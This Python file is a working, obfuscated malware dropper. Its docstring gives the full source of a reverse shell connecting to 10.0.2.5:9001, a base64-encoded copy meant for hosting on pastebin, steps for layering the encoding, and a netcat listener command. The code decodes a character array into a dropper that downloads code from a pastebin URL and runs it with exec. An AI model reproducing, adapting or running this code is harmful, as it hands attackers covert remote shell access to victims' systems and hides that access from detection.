"""
This dropper fetches the following obfuscated reverse shell from pastebin:

1. Original reverse shell code:

import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.2.5",9001))

p=subprocess.Popen(["cmd"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()

2. Obfuscated reverse shell code (paste it to pastebin):
aW1wb3J0IG9zLHNvY2tldCxzdWJwcm9jZXNzLHRocmVhZGluZzsKZGVmIHMycChzLCBwKToKICAgIHdoaWxlIFRydWU6CiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQogICAgICAgIGlmIGxlbihkYXRhKSA+IDA6CiAgICAgICAgICAgIHAuc3RkaW4ud3JpdGUoZGF0YSkKICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpCgpkZWYgcDJzKHMsIHApOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkKCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjEwLjAuMi41Iiw5MDAxKSkKCnA9c3VicHJvY2Vzcy5Qb3BlbihbImNtZCJdLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkKCnMycF90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zMnAsIGFyZ3M9W3MsIHBdKQpzMnBfdGhyZWFkLmRhZW1vbiA9IFRydWUKczJwX3RocmVhZC5zdGFydCgpCgpwMnNfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cDJzLCBhcmdzPVtzLCBwXSkKcDJzX3RocmVhZC5kYWVtb24gPSBUcnVlCnAyc190aHJlYWQuc3RhcnQoKQoKdHJ5OgogICAgcC53YWl0KCkKZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OgogICAgcy5jbG9zZSgp

3. The following code is an original dropper that needs to be obfuscated:

import urllib.request, base64
def fetch_and_execute(url):
    try:
        with urllib.request.urlopen(url) as response:
            code = response.read().decode("utf-8")
            exec(base64.b64decode(code))
    except Exception as e:
        print(f"An error occurred: {e}")
pastebin_url = "https://pastebin.com/raw/<url>"
fetch_and_execute(pastebin_url)

4. Convert it into reverse base64 and then into reverse list of Unicode chars.
5. Once converted place the content of array into arr list.
6. Before running the dropper make sure you spin up a revshell listener using nc -nlvp 9001
"""

import base64
import urllib
arr = [97, 87, 49, 119, 98, 51, 74, 48, 73, 72, 86, 121, 98, 71, 120, 112, 89, 105, 53, 121, 90, 88, 70, 49, 90, 88, 78, 48, 76, 67, 66, 105, 89, 88, 78, 108, 78, 106, 
81, 75, 90, 71, 86, 109, 73, 71, 90, 108, 100, 71, 78, 111, 88, 50, 70, 117, 90, 70, 57, 108, 101, 71, 86, 106, 100, 88, 82, 108, 75, 72, 86, 121, 98, 67, 107, 54, 67, 105, 65, 103, 73, 67, 66, 48, 99, 110, 107, 54, 67, 105, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 100, 50, 108, 48, 97, 67, 66, 49, 99, 109, 120, 115, 97, 87, 73, 117, 99, 109, 86, 120, 100, 87, 86, 122, 100, 67, 53, 49, 99, 109, 120, 118, 99, 71, 86, 117, 75, 72, 86, 121, 98, 67, 107, 103, 89, 88, 77, 103, 99, 109, 86, 122, 99, 71, 57, 117, 99, 50, 85, 54, 67, 105, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 71, 78, 118, 90, 71, 85, 103, 80, 83, 66, 121, 90, 88, 78, 119, 98, 50, 53, 122, 90, 83, 53, 121, 90, 87, 70, 107, 75, 67, 107, 117, 90, 71, 86, 106, 98, 50, 82, 108, 75, 67, 74, 49, 100, 71, 89, 116, 79, 67, 73, 112, 67, 105, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 65, 103, 73, 71, 86, 52, 90, 87, 77, 111, 89, 109, 70, 122, 90, 84, 89, 48, 76, 109, 73, 50, 78, 71, 82, 108, 89, 50, 57, 107, 90, 83, 104, 106, 98, 50, 82, 108, 87, 122, 111, 54, 76, 84, 70, 100, 75, 83, 107, 75, 73, 67, 65, 103, 73, 71, 86, 52, 89, 50, 86, 119, 100, 67, 66, 70, 101, 71, 78, 108, 99, 72, 82, 112, 98, 50, 52, 103, 89, 88, 77, 103, 90, 84, 111, 75, 73, 67, 65, 103, 73, 67, 65, 103, 73, 67, 66, 119, 99, 109, 108, 117, 100, 67, 104, 109, 73, 107, 70, 117, 73, 71, 86, 121, 99, 109, 57, 121, 73, 71, 57, 106, 89, 51, 86, 121, 99, 109, 86, 107, 79, 105, 66, 55, 90, 88, 48, 105, 75, 81, 112, 119, 89, 88, 78, 48, 90, 87, 74, 112, 98, 108, 57, 49, 99, 109, 119, 103, 80, 83, 65, 105, 97, 72, 82, 48, 99, 72, 77, 54, 76, 121, 57, 119, 89, 88, 78, 48, 90, 87, 74, 112, 98, 105, 53, 106, 98, 50, 48, 118, 99, 109, 70, 51, 76, 51, 108, 70, 90, 50, 74, 84, 101, 71, 90, 66, 73, 103, 112, 109, 90, 88, 82, 106, 97, 70, 57, 104, 98, 109, 82, 102, 90, 88, 104, 108, 89, 51, 86, 48, 90, 83, 104, 119, 89, 88, 78, 48, 90, 87, 74, 112, 98, 108, 57, 49, 99, 109, 119, 112]
exec(base64.b64decode("".join(chr(i) for i in arr[::-1])[::-1]).decode('utf-8'))
